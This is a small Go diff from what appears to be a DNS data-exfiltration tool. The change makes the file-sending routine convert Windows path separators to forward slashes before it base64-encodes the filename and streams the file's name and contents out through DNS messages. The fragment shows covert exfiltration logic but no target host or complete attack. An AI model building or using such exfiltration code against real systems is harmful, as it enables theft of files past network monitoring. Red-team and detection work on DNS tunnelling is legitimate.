@@ -94,7 +94,8 @@ func (ex *dnsExfiltrator) ExfiltrateFile(filename string) {
 		log.Fatalln(err)
 	}
 
-	encodedFilename := encodeToModifiedBase64([]byte(filename))
+	unixFilename := strings.Replace(filename, "\\", "/", -1)
+	encodedFilename := encodeToModifiedBase64([]byte(unixFilename))
 	ex.exfiltrateData(DNS_FILE_START, encodedFilename)
 	encodedData := encodeToModifiedBase64(data)
 	ex.exfiltrateData(DNS_FILE_DATA, encodedData)
